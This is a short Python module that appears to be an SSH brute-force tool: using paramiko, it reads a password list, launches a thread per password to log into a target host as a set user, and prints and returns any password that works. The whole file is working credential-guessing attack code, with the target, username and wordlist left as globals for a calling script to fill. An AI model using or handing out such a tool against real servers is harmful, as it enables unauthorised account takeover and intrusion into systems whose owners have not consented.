import paramiko,os,sys,socket
#Final
import threading,time

def ssh_connect(passw,code=0):
    global stop_flag
    global idpass
    ssh=paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host,port=22,username=username,password=passw)
        stop_flag=1
        idpass=[username,passw]
        print("passowrd found : ",passw,", user name  : ",username)
    except Exception as erd:
        print(erd)
        #print("Incorrect Login : ",passw)
        pass
    ssh.close()

def bruteforce():
    global input_file, stop_flag, idpass
    idpass=["Not Found","Not Found"]
    stop_flag=0
    f_name=os.path.join(os.path.dirname(__file__),input_file)
    print(f_name,input_file)
    if (os.path.isfile(f_name))==False:
        print("File/Path doesnt exist")
        # sys.exit(1)
    with open(f_name,'r') as file:
        for line in file.readlines():
            print("working.."+str(line))
            if stop_flag==1:
                try:
                    # t.join()
                    exit(0)
                    break
                except SystemExit as e:
                    print(e)
                    break

            passw=line.strip()
            t=threading.Thread(target=ssh_connect,args=(passw,))
            t.start()
            time.sleep(0.5)
    idpass[0]=username
    return idpass

if __name__=='__main__':
    pass
else:
    stop_flag=0
    idpass=["Not Found","Not Found"]
    host=""
    # username=input('')
    username=""
    input_file=""

    # test()

